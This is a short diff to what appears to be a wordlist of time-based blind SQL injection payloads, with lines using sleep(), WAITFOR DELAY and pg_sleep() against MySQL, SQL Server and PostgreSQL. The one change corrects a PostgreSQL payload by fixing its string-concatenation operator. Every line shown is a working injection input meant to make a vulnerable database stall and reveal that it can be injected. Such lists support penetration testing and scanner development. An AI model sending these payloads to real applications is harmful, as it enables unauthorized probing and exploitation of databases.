@@ -9,5 +9,5 @@ if(now()=sysdate(),sleep(5),0)
 ' WAITFOR DELAY '0:0:5'--
 7;SELECT PG_SLEEP(5)--
 pg_sleep(5)
-'| |pg_sleep(5)--
+'||pg_sleep(5)--
 '+(select*from(select(if(1=1,sleep(5),false)))a)+'
